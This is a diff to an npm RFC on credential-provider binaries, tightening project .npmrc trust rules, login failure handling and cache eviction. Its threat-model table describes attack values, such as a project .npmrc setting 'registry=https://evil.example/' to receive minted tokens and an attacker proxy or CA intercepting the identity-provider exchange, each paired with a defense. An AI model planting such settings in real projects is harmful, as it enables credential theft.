@@ -193,8 +193,10 @@ ordered, comma-separated list of provider ids:
 
 Precedence: per-registry > per-scope > global default.
 
-Only user or global `.npmrc` grants execution trust. `credentialProvider`
-in project `.npmrc` is ignored entirely.
+Only user or global `.npmrc` grants execution trust. All
+`credentialProvider*` keys (`credentialProvider`,
+`credentialProviderTimeoutMs`, `credentialProviderAccountHint`) in project
+`.npmrc` are ignored entirely.
 
 npm tries providers in the order listed. When a provider returns an `Err`
 with kind `"url-not-supported"`, npm advances to the next provider. If all
@@ -256,7 +258,7 @@ protocol:
   per loglevel but never parses it.
 - Exit code 0 + recognized `Ok` response = success. Non-zero exit or `Err`
   response = failure.
-- npm enforces a per-request-kind timeout (see [Timeout and retry](#timeout-and-retry)).
+- npm enforces a uniform timeout (see [Timeout and retry](#timeout-and-retry)).
   On expiry, npm kills the process and treats it as failure. Configurable via
   `credentialProviderTimeoutMs` in user/global `.npmrc`.
 
@@ -274,9 +276,19 @@ Git credential helpers.
 | `logout` | no | Remove stored credentials — hooks into `npm logout` |
 
 Providers must implement `get`. `login` and `logout` are optional — a provider
-that does not support them must return `operation-not-supported`, and npm will
-fall back to its default login/logout behavior (prompting for a token and
-persisting it to `.npmrc`).
+that does not support them must return `operation-not-supported`.
+
+When a provider returns `operation-not-supported` for `login`, npm must
+**hard-fail** — it must not fall back to prompting for a plaintext token.
+Rationale: `login` is optional, so a get-only provider always returns
+`operation-not-supported`. Falling back to the default login flow would
+persist a plaintext token to `.npmrc`, which is the security regression this
+RFC exists to prevent. If a user needs legacy login behavior, they must
+remove the provider configuration for that registry first.
+
+When a provider returns `operation-not-supported` for `logout`, npm falls
+back to its default logout behavior (removing `.npmrc` token entries) with
+a warning.
 
 #### `get` request
 
@@ -337,7 +349,7 @@ user-managed only. Providers may ignore the hint.
   var sniffing adds heuristic complexity with no clear standard. The user
   knows their context — `--no-interactive` is the explicit opt-out.
 - **CI guidance:** CI pipelines should pass the new `--no-interactive` flag
-  (or its env var equivalent `npm_config_no_interactive=true`, per npm's
+  (or its env var equivalent `npm_config_interactive=false`, per npm's
   standard config-to-env mapping). This is consistent with npm's existing
   CI guidance — use `npm ci` instead of `npm install`, etc. — where CI
   environments are expected to opt in to stricter, non-interactive behavior
@@ -355,11 +367,17 @@ cannot inherit these settings from the environment — npm's `cafile` and
 `strict-ssl` are npm-specific config, not Node.js TLS defaults, and proxy
 settings may differ from environment variables.
 
+npm must source `network.*` fields exclusively from user/global `.npmrc`.
+Project-level `strict-ssl`, `cafile`, `https-proxy`, `proxy`, and `noproxy`
+settings must never be forwarded to credential providers. A checked-in project
+`.npmrc` could otherwise route the provider's IdP exchange through an attacker
+proxy or pin a malicious CA and intercept the token.
+
 Providers must ignore unknown fields for forward compatibility.
 
 npm expects providers to support the protocol version npm declares (`v`).
 If a provider does not support the declared version, it must respond with an
-`Err` of kind `"operation-not-supported"` with an appropriate message. npm will
+`Err` of kind `"version-not-supported"` with an appropriate message. npm will
 fail with actionable guidance and must not retry with a lower version.
 
 #### `get` success response
@@ -416,6 +434,7 @@ delegates to the provider rather than performing its default behavior
   "registry": "https://registry.example.com/",
   "accountHint": "user@example.com",
   "interactive": true,
+  "retry": true,
   "logLevel": "info",
   "network": {
     "httpsProxy": "https://proxy.example.com:8080",
@@ -431,6 +450,7 @@ delegates to the provider rather than performing its default behavior
 | `registry` | string | yes | Target registry base URI. |
 | `accountHint` | string | no | From `.npmrc` config (`credentialProviderAccountHint`). |
 | `interactive` | boolean | yes | `true` by default; `false` with `--no-interactive`. |
+| `retry` | boolean | yes | Always `true` for `login` — provider must bypass cache and force fresh authentication. |
 | `logLevel` | string | yes | Current npm log verbosity. |
 | `network` | object | no | Proxy and TLS settings (same shape as `get`). Needed for outbound requests to identity providers. |
 
@@ -516,10 +536,14 @@ Response on success:
   configured and returns `Ok`. It delegates to the provider.
 - If no provider is configured, `npm login` and `npm logout` behave as today
   with no warning.
-- If a provider is configured but returns `operation-not-supported` for the
-  request kind, `npm login` and `npm logout` fall back to default behavior and
-  must emit an explicit warning that the operation downgraded from credential
-  provider mode.
+- If a provider is configured but returns `operation-not-supported` for
+  `login`, `npm login` must hard-fail — no fallback. A get-only provider
+  always returns `operation-not-supported` for `login`; falling back would
+  persist a plaintext token to `.npmrc`. If a user needs legacy login, they
+  must remove the provider configuration first.
+- If a provider is configured but returns `operation-not-supported` for
+  `logout`, npm falls back to default logout behavior (removing `.npmrc`
+  token entries) and emits a warning.
 - If a provider is configured and fails during `login` (error kind `"other"`,
   timeout, or non-zero exit), `npm login` must hard-fail — no fallback.
   Falling back would persist a plaintext token to `.npmrc`, which is the exact
@@ -528,7 +552,12 @@ Response on success:
   timeout, or non-zero exit), `npm logout` falls back to removing the
   `.npmrc` token entry and must emit an explicit warning. Logout failure
   does not create a security hole — the fallback ensures local credentials
-  are still cleared.
+  are still cleared. Note: in the provider-managed model, credentials live in
+  the provider's secure storage (e.g. OS keychain), not in `.npmrc`. On logout
+  failure, the provider's stored credentials may remain active. npm should
+  warn users that they may need to manually clear provider-managed credentials
+  (e.g. by running the provider's own logout command or clearing the OS
+  keychain entry).
 
 #### Error response
 
@@ -537,7 +566,7 @@ On failure, the provider responds with an `Err` object:
 ```json
 {
   "Err": {
-    "kind": "operation-not-supported",
+    "kind": "version-not-supported",
     "message": "Protocol version 2 is not supported by this provider."
   }
 }
@@ -546,7 +575,8 @@ On failure, the provider responds with an `Err` object:
 | Error kind | Meaning | npm behavior |
 |------------|---------|--------------|
 | `"url-not-supported"` | Provider does not handle this registry. | Skip to next provider in the configured list. |
-| `"operation-not-supported"` | Provider does not support this request kind. | `get`/`logout`: fall back to legacy auth with warning. `login`: fall back with warning. |
+| `"version-not-supported"` | Provider does not support the declared protocol version. | Hard-fail with actionable guidance (update provider). No retry with lower version. |
+| `"operation-not-supported"` | Provider does not support this request kind. | `get`/`logout`: fall back to legacy auth with warning. `login`: hard-fail — no fallback. |
 | `"other"` | Generic error. | `get`/`logout`: fall back to legacy auth with warning. `login`: hard-fail — no fallback. |
 
 Fields:
@@ -568,7 +598,8 @@ the process and treats it as failure. Users can override the default with
 
 When npm receives HTTP 401, 403, or a similar auth failure from a registry:
 
-1. npm evicts the in-memory cached credential for that registry.
+1. npm evicts all in-memory cached credentials for that registry (all
+   permission variants).
 2. npm spawns the provider with a new `get` request with `retry: true`.
    The provider should invalidate its cached credentials and re-acquire.
 3. If the provider returns new credentials, npm retries the failed registry
@@ -589,9 +620,11 @@ scenarios that surface as 403.
   **process-lifetime in-memory cache** only.
 - Cache key: provider id + registry base URI + permission.
 - npm must not persist tokens to disk.
-- On auth failure, npm evicts the in-memory cache for that registry
+- On auth failure (401/403), npm evicts **all** permission variants of the
+  in-memory cache for that registry (both read-only and read-write entries)
   and re-spawns the provider with `retry: true`, signaling it to bypass its
-  own cache.
+  own cache. This avoids stale entries when a read-write rejection also
+  invalidates the read-only token (worst case is one redundant spawn).
 
 ### Example flows
 
@@ -620,7 +653,9 @@ $ npm login --registry https://registry.example.com
 
 $ npm publish
 # npm resolves registry from project .npmrc; credential provider resolved from user .npmrc
-# Provider spawned with get request — returns cached token instantly from keychain. If token is not cached or needs to be refreshed, provider spawned again with login request — opens full auth flow (browser, device code, SSO)
+# Provider spawned with get request (permission: read-write) — returns cached token
+# instantly from keychain. If token is expired or unavailable, provider re-acquires
+# silently (refresh token) or interactively (browser/device code) within the same get call.
 ```
 
 #### CI: managed identity / workload identity
@@ -655,11 +690,15 @@ $ npm ci --no-interactive
 | Threat | Attack vector | Defense |
 |--------|--------------|---------|
 | Binary substitution at rest | Malware, compromised install script, shared workstation | Global prefix resolution + OS file permissions |
-| Malicious lifecycle scripts | `postinstall` overwrites provider | OS file permissions + opt-in install scripts |
+| Malicious lifecycle scripts | `postinstall` overwrites provider | OS file permissions + opt-in install scripts (default in npm 12+) |
 | PATH poisoning | Malicious `.env`, shell profile, CI manipulation | Global prefix resolution (no `$PATH` search) |
 | Typosquatting | Similarly-named package on public registry | User/global `.npmrc` is the trust boundary |
-| Malicious project `.npmrc` | Repo plants rogue provider config | Project `.npmrc` `credentialProvider` ignored |
-| Credential exfiltration via lifecycle scripts | `postinstall` spawns provider binary or `npm`/`npx` to acquire token | Opt-in install scripts |
+| Malicious project `.npmrc` | Repo plants rogue provider config | All `credentialProvider*` keys ignored from project `.npmrc` |
+| Timeout manipulation via project `.npmrc` | `credentialProviderTimeoutMs=1` forces timeout to trigger fallback | `credentialProviderTimeoutMs` ignored from project `.npmrc` |
+| Account hint redirection | `credentialProviderAccountHint` redirects to attacker account | `credentialProviderAccountHint` ignored from project `.npmrc` |
+| Credential exfiltration via lifecycle scripts | `postinstall` spawns provider binary or `npm`/`npx` to acquire token | Opt-in install scripts (default in npm 12+) |
+| Token exfiltration via registry redirect | Project `.npmrc` sets `registry=https://evil.example/`; global provider mints a token and npm sends it to the attacker | Providers should return `url-not-supported` for unknown registries. Providers are strongly encouraged to maintain an internal allowlist of trusted registry hosts and reject requests for unrecognized hosts. |
+| Network interception via project `.npmrc` | Project `.npmrc` sets `https-proxy` or `cafile` to route provider IdP calls through attacker proxy | `network.*` fields sourced from user/global `.npmrc` only; project-level network settings never forwarded to providers |
 
 #### Process memory
 
